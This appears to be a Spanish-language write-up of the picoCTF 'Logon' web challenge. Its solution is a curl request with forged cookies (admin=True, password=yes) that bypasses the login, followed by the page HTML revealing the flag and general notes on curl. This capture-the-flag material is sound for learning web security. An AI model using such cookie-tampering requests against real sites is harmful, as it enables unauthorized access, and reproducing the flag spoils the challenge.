## Descripción 
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573
## Hints
1. Hmm it doesn't seem to check anyone's password, except for Joe's?
## Solución
```
</html>DanielMtzC-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/p44573/flag -H "Cookie: username=admin; password=yes; admin=True" 
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

```
## Notas
El comando `curl` sirve para ==transferir datos utilizando diversas sintaxis de URL y una amplia gama de protocolos (HTTP, HTTPS, FTP, etc.) desde la línea de comandos==. Es una herramienta para desarrolladores y administradores de sistemas que permite descargar archivos, interactuar con APIs web, automatizar tareas de transferencia de datos y monitorear la salud de sitios web. 

Usos principales del comando `curl`:

- **Descargar archivos**: 
    
    Permite descargar archivos de internet directamente desde la terminal, guardándolos en tu sistema. 
    

- **Interactuar con APIs**: 
    
    Se utiliza para enviar y recibir datos de servicios web, como al hacer una petición POST a una API, que es una forma de "simular" la acción de un navegador web. 
    

- **Automatizar tareas**: 
    
    Es una herramienta clave para automatizar transferencias de archivos o secuencias de operaciones que no requieren supervisión. 
    

- **Monitorear sitios web**: 
    
    Se puede emplear para verificar la conectividad y el estado de un sitio web o servidor, ya que puede simular la acción de un usuario navegando. 
    

- **Transferir datos con diferentes protocolos**: 
    
    Además de HTTP/HTTPS, es compatible con protocolos como FTP, SFTP, y SMTP, lo que lo hace muy versátil. 
    

Ejemplos de lo que puedes hacer con `curl`:

- **Descargar un archivo**: `curl -O [URL_del_archivo]` (guarda el archivo con su nombre original). 

- **Enviar datos a una API**: `curl -X POST -d '{"nombre": "Ejemplo"}' [URL_de_la_API]`. 

- **Ver los encabezados de una respuesta**: `curl -i [URL]` (muestra los encabezados junto con el contenido). 

- **Seguir redirecciones**: `curl -L [URL]` (sigue automáticamente las redirecciones del servidor a la URL final).
## Referencias

[[Dont-use-client-side]]